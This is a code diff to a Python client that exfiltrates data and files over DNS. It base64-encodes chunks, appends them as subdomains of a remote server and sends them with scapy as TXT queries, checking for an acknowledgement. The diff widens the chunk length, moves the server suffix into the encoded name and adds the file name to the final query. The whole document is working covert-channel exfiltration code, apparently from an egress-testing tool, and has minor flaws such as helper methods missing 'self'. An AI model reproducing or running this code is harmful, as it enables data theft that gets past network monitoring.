@@ -19,7 +19,7 @@ class Client:
     def __init__(self, cli_object):
         self.protocol = "dns_resolved"
         self.remote_server = cli_object.ip
-        self.max_length = 30
+        self.max_length = 68
         if cli_object.file is None:
             self.file_transfer = False
             self.length = 50
@@ -29,6 +29,18 @@ class Client:
                 self.file_transfer = cli_object.file.split("/")[-1]
             else:
                 self.file_transfer = cli_object.file
+
+    def dns_encode(outgoing_data):
+        # This function from http://bb.secdev.org/scapy/issue/500/les-r-ponses-dns-de-type-txt-sont-malform
+        for i in range(0, len(outgoing_data), 0xff+1):
+            outgoing_data = outgoing_data[:i] + chr(len(outgoing_data[i:i+0xff])) + outgoing_data[i:]
+        return outgoing_data
+
+    def randomKey(b=20):
+        """
+        Returns a random string/key of "b" characters in length, defaults to 32
+        """
+        return ''.join(random.choice(string.ascii_letters + string.digits) for x in range(b))
 
     def transmit(self, data_to_transmit):
 
@@ -64,6 +76,7 @@ class Client:
                     sys.exit()
             else:
                 encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+                encoded_data = encoded_data + "." + self.remote_server
 
                 while len(encoded_data) > self.max_length:
 
@@ -75,49 +88,49 @@ class Client:
                         packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)
                     check_total = True
                     encoded_data = base64.b64encode(str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+                    encoded_data = encoded_data + "." + self.remote_server
 
-                    if check_total:
-                        self.current_total = packet_number + packet_diff
-                        check_total = False
+                if check_total:
+                    self.current_total = packet_number + packet_diff
+                    check_total = False
 
-                    print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
+                print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
 
-                    # Craft the packet with scapy
-                    try:
-                        while True:
+                # Craft the packet with scapy
+                try:
+                    while True:
 
-                            if '=' in encoded_data:
-                                print "found equal"
-                                encoded_data = encoded_data.replace('=', '-pqp-')
-                            print encoded_data
+                        if '=' in encoded_data:
+                            encoded_data = encoded_data.replace('=', '-pqp-')
 
-                            response_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
-                                rd=1, id=15, opcode=0,
-                                qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="TXT")], aa=1, qr=0),
-                                verbose=False, timeout=2)
+                        response_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
+                            rd=1, id=15, opcode=0,
+                            qd=[DNSQR(qname=encoded_data, qtype="TXT")], aa=1, qr=0),
+                            verbose=False, timeout=2)
 
-                            if response_packet:
-                                if response_packet.haslayer(DNSRR):
-                                    dnsrr_strings = repr(response_packet[DNSRR])
-                                    if str(packet_number) + "allgoodhere" in dnsrr_strings:
-                                        break
-                    except KeyboardInterrupt:
-                        print "You just rage quit!"
-                        sys.exit()
+                        if response_packet:
+                            if response_packet.haslayer(DNSRR):
+                                dnsrr_strings = repr(response_packet[DNSRR])
+                                if str(packet_number) + "allgoodhere" in dnsrr_strings:
+                                    break
+
+                except KeyboardInterrupt:
+                    print "You just rage quit!"
+                    sys.exit()
 
                 # Increment counters
                 byte_reader += self.length
                 packet_number += 1
 
-            if self.file_transfer is not False:
+        if self.file_transfer is not False:
 
-                while True:
-                    final_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
-                        id=15, opcode=0,
-                        qd=[DNSQR(qname="file---" + self.file_transfer, qtype="TXT")], aa=1, qr=0),
-                        verbose=True, timeout=2)
+            while True:
+                final_packet = sr1(IP(dst=nameserver)/UDP()/DNS(
+                    id=15, opcode=0,
+                    qd=[DNSQR(qname="file---" + self.file_transfer + "." + self.remote_server, qtype="TXT")], aa=1, qr=0),
+                    verbose=True, timeout=2)
 
-                    if final_packet:
-                        break
+                if final_packet:
+                    break
 
         return
